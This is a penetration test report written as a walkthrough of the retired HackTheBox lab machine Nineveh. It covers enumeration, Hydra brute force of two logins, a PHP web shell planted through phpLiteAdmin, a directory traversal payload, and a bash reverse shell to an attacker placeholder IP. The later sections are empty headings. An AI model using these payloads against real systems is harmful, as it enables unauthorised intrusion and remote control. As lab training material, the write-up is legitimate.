# HTB Nineveh - OSCP-Style Penetration Test Report

**Author:** randalltr

**Date:** 2026-1-27

---

## 0. Lesson Learned

Each time you get stuck, go back and review what you have already found. What are the loose ends?

When testing directory traversal, remove file extensions and try treating the path like a directory, not a file.

---

## 1. Executive Summary

A penetration test was conducted against the target host *Nineveh*. The assessment identified multiple critical vulnerabilities including weak authentication, insecure web application configuration, directory traversal, remote code execution, and insecure scheduled task execution. These issues were successfully chained to obtain initial access as a low-privileged web user and subsequently escalate privileges to root, resulting in full system compromise.

---

## 2. Scope

- **Target:** 10.129.186.238
- **Environment:** HackTheBox Nineveh (Retired Machine)
- **Testing Window:** 2026-1-20 to 2026-1-22
- **Objective:** Full system compromise

---

## 3. Methodology

Testing followed a standard OSCP methodology:

- Information Gathering
- Enumeration
- Initial Access
- Post-Exploitation
- Privilege Escalation
- Proof of Compromise

---

## 4. Information Gathering

A full TCP and UDP scan were performed with Nmap:

```
nmap -p- -sCV 10.129.186.238 -T4 -oA nineveh_initial

nmap -sU 10.129.186.238 -oA nineveh_udp
```

Identified services:

- TCP/80 - Apache httpd 2.4.18
- TCP/443 - Apache httpd 2.4.18 (expired SSL certificate)
- HTTP protocol version: HTTP/1.1

---

## 5. Enumeration

### Web Enumeration

Directory brute-force enumeration was performed to discover hidden web content:

```
gobuster dir -u https://10.129.186.238 -w /usr/share/wordlists/dirb/common.txt -k --no-error
```

This identified multiple directories of interest, including:

- `/db/`
- `/department/`
- `/secure_notes/`
- `/info.php`

Further enumeration using larger wordlists against each directory was performed to confirm content:

```
gobuster dir -u https://10.129.186.238/<directory>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -x php,html --no-error
```

### Information Disclosure

Accessing `/info.php` disclosed sensitive system information, including:

- PHP version 7.0.18
- Operating System: Ubuntu 16.04.2 LTS
- Linux kernel 4.4.0-62-generic
- MySQL version 5.0.12-dev

---

## 6. Initial Access

### Credential Brute Force - Department Login

The `/department/login.php` page was identified as a login portal and `admin` was identified as a username based on login attempt responses. A brute-force attack was performed using Hydra against the HTTP POST login form:

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.129.186.238 http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid Password"
```

Valid credentials obtained:

- Username: `admin`
- Password: `1q2w3e4r5t`

### phpLiteAdmin Authentication Bypass

The `/db/` directory exposed phpLiteAdmin v1.9. A brute-force attack was performed against the password-only login form:

```
hydra -l '' -P /usr/share/wordlists/rockyou.txt 10.129.186.238 https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password."
```

Valid password obtained:

- `password123`

### Remote Code Execution via phpLiteAdmin

The installed phpLiteAdmin version was vulnerable to remote PHP code injection. A malicious database file containing PHP code was created:

```
<?php system($_REQUEST["cmd"]); ?>
```

The file was written to disk and later executed through a directory traversal vulnerability.

---

## 7. Post-Exploitation

### Directory Traversal

The `notes` parameter in `manage.php` was vulnerable to directory traversal:

```
/department/manage.php?notes=files/ninevehNotes/../../../../../../../etc/passwd
```

This confirmed arbitrary file read access.

### Remote Command Execution

The previously created PHP file was executed via traversal to obtain a reverse shell:

```
/department/manage.php?notes=files/ninevehNotes/../../../../../../var/tmp/hack.php&cmd=/bin/bash -c 'bash -i >& /dev/tcp/<attacker-ip>/443 0>&1'
```

A listener was started on the attacker system:

```
nc -lnvp 443
```

This resulted in a shell as `www-data` (uid=33).

---

## 8. Privilege Escalation

---

## 9. Proof of Compromise

---

## 10. Findings & Recommendations

---

## 11. Appendix

phpLiteAdmin <= 1.9.3 - PHP Remote Code Execution:
[https://www.exploit-db.com/exploits/24044](https://www.exploit-db.com/exploits/24044)